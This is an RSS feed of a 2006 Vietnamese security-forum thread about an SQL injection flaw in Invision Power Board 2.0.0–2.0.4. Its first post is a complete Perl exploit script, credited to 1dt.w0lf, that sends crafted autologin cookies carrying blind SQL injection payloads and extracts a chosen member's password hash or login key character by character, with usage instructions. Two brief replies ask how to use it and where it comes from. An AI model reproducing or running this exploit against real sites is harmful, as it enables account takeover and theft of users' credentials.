<?xml version="1.0" encoding="UTF-8"?>
<rss version="2.0">
	<channel>
		<title><![CDATA[Latest posts for the topic "Lỗi SQL injection của IPB v 2.0.0 - 2.0.4 "]]></title>
		<link>/hvaonline/posts/list/13.html</link>
		<description><![CDATA[Latest messages posted in the topic "Lỗi SQL injection của IPB v 2.0.0 - 2.0.4 "]]></description>
		<generator>JForum - http://www.jforum.net</generator>
			<item>
				<title>Lỗi SQL injection của IPB v 2.0.0 - 2.0.4 </title>
				<description><![CDATA[ use IO::Socket;   

if (@ARGV < 4) { &usage; }   

$server    = $ARGV[0];   
$path      = $ARGV[1];   
$member_id = $ARGV[2];   
$target    = $ARGV[3];   

$pass = ($target)?('member_login_key'):('password');   

$server =~ s!<span class="link"> http://</span>)!!;   

$request  = 'http://';   
$request .= $server;   
$request .= $path;   

$s_num = 1;   
$|++;   
$n = 0;   

print "[~]    SERVER : $server\r\n";   
print "[~]      PATH : $path\r\n";   
print "[~] MEMBER ID : $member_id\r\n";   
print "[~]    TARGET : $target";   
print (($target)?(' - IPB 2.*'):(' - IPB 1.*'));   
print "\r\n";   
print "[~] SEARCHING PASSWORD ... [|]";   

($cmember_id = $member_id) =~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;   

while(1)   
{   
if(&found(47,58)==0) { &found(96,122); }   
$char = $i;   
if ($char=="0")   
 {   
 if(length($allchar) > 0){   
 print qq{bb DONE ]   
    
 MEMBER ID : $member_id   
 };   
 print (($target)?('MEMBER_LOGIN_KEY : '):('PASSWORD : '));   
 print $allchar."\r\n";   
 }   
 else   
 {   
 print "\b\b FAILED ]";   
 }   
 exit();   
 }   
else   
 {   
  $allchar .= chr($char);   
 }   
$s_num++;   
}   

sub found($$)   
 {   
 my $fmin = $_[0];   
 my $fmax = $_[1];   
 if (($fmax-$fmin)<5) { $i=crack($fmin,$fmax); return $i; }   
    
 $r = int($fmax - ($fmax-$fmin)/2);   
 $check = " BETWEEN $r AND $fmax";   
 if ( &check($check) ) { &found($r,$fmax); }   
 else { &found($fmin,$r); }   
 }   
    
sub crack($$)   
 {   
 my $cmin = $_[0];   
 my $cmax = $_[1];   
 $i = $cmin;   
 while ($i<$cmax)   
  {   
  $crcheck = "=$i";   
  if ( &check($crcheck) ) { return $i; }   
  $i++;   
  }   
 $i = 0;   
 return $i;   
 }   
    
sub check($)   
 {   
 $n++;   
 status();   
 $ccheck = $_[0];   
 $pass_hash1 = "%36%36%36%2527%20%4F%52%20%28%69%64%3D";   
 $pass_hash2 = "%20%41%4E%44%20%61%73%63%69%69%28%73%75%62%73%74%72%69%6E%67%28";   
 $pass_hash3 = $pass.",".$s_num.",1))".$ccheck.") /*";   
 $pass_hash3 =~ s/(.)/"%".uc(sprintf("%2.2x",ord($1)))/eg;   
 $nmalykh    = "%20%EC%E0%EB%FB%F5%20%2D%20%EF%E8%E4%E0%F0%E0%F1%21%20";   
 $socket = IO::Socket::INET->new( Proto => "tcp", PeerAddr => "$server", PeerPort => "80");   

 printf $socket ("GET %sindex.php?act=Login&CODE=autologin HTTP/1.0\nHost: %s\nAccept: */*\nCookie: member_id=%s; pass_hash=%s%s%s%s%s\nConnection: close\n\n",   
 $path,$server,$cmember_id,$pass_hash1,$cmember_id,$pass_hash2,$pass_hash3,$nmalykh);   
    
 while(<$socket>)   
  {   
  if (/Set-Cookie: session_id=0;/) { return 1; }   
  }   

 return 0;   
 }   
    
sub status()   
{   
  $status = $n % 5;   
  if($status==0){ print "\b\b/]";  }   
  if($status==1){ print "\b\b-]";  }   
  if($status==2){ print "\b\b\\]"; }   
  if($status==3){ print "\b\b|]";  }   
}   

sub usage()   
 {   
 print q(   
 Invision Power Board v < 2.0.4 SQL injection exploit   
 ----------------------------------------------------   
 USAGE:   
 ~~~~~~   
 r57ipb2.pl [server] [/folder/] [member_id] [target]   
    
 [server]    - host where IPB installed   
 [/folder/]  - folder where IPB installed   
 [member_id] - user id for brute   
    
 targets:   
          0 - IPB 1.*   
          1 - IPB 2.* (Prior To 2.0.4)   
    
 e.g. r57ipb2.pl 127.0.0.1 /IPB/ 1 1   
 ----------------------------------------------------   
 (c)oded by 1dt.w0lf   
 RST/GHC ,<span class="link"> http://rst.void.ru</span> ,<span class="link"> http://ghc.ru</span>   
 );   
 exit();   
 } ]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/2424.html#12821</guid>
				<link>/hvaonline/posts/list/2424.html#12821</link>
				<pubDate><![CDATA[Sun, 6 Aug 2006 21:01:36]]> GMT</pubDate>
				<author><![CDATA[ hinavietnam]]></author>
			</item>
			<item>
				<title>Lỗi SQL injection của IPB v 2.0.0 - 2.0.4 </title>
				<description><![CDATA[ XÀi như thế nào hả pác :D
]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/2424.html#13231</guid>
				<link>/hvaonline/posts/list/2424.html#13231</link>
				<pubDate><![CDATA[Tue, 8 Aug 2006 10:45:09]]> GMT</pubDate>
				<author><![CDATA[ +Newbie+]]></author>
			</item>
			<item>
				<title>Re: Lỗi SQL injection của IPB v 2.0.0 - 2.0.4 </title>
				<description><![CDATA[ Phải cho cái nguồn, ví dụ securityfocus.com chẳng hạn, chứ không thì biết thế nào được.]]></description>
				<guid isPermaLink="true">/hvaonline/posts/list/2424.html#13301</guid>
				<link>/hvaonline/posts/list/2424.html#13301</link>
				<pubDate><![CDATA[Tue, 8 Aug 2006 17:04:12]]> GMT</pubDate>
				<author><![CDATA[ KINYO]]></author>
			</item>
	</channel>
</rss>
